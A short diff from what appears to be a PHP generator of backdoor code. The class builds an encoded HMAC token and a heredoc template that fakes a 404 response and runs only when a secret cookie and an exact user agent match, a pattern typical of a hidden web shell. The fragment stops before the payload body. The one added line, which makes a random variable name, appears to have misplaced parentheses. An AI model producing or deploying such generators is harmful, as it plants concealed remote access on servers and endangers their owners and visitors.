@@ -25,6 +25,7 @@ class dynamic_generator
                 $do_hash = hash_hmac('sha256', $post_value . '.' . $caller . '?r=pull', $post_value);
                 $final = base64_encode(serialize($do_hash . '.' . $post_value . '.' . $caller . '?r=pull'));
                 $random_data_var = substr(allowed_chars, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 10)));
+                $random_uuid_var = substr(allowed_chars, rand(1, 15), rand(0, strlen(allowed_chars)). bin2hex(openssl_random_pseudo_bytes(rand(1, 15))));
                 $dr = <<<SLIMM
 http_response_code(404);
 if (isset(\$_COOKIE['$cookieName']) && \$_SERVER['HTTP_USER_AGENT'] === '$randomized_ua'){
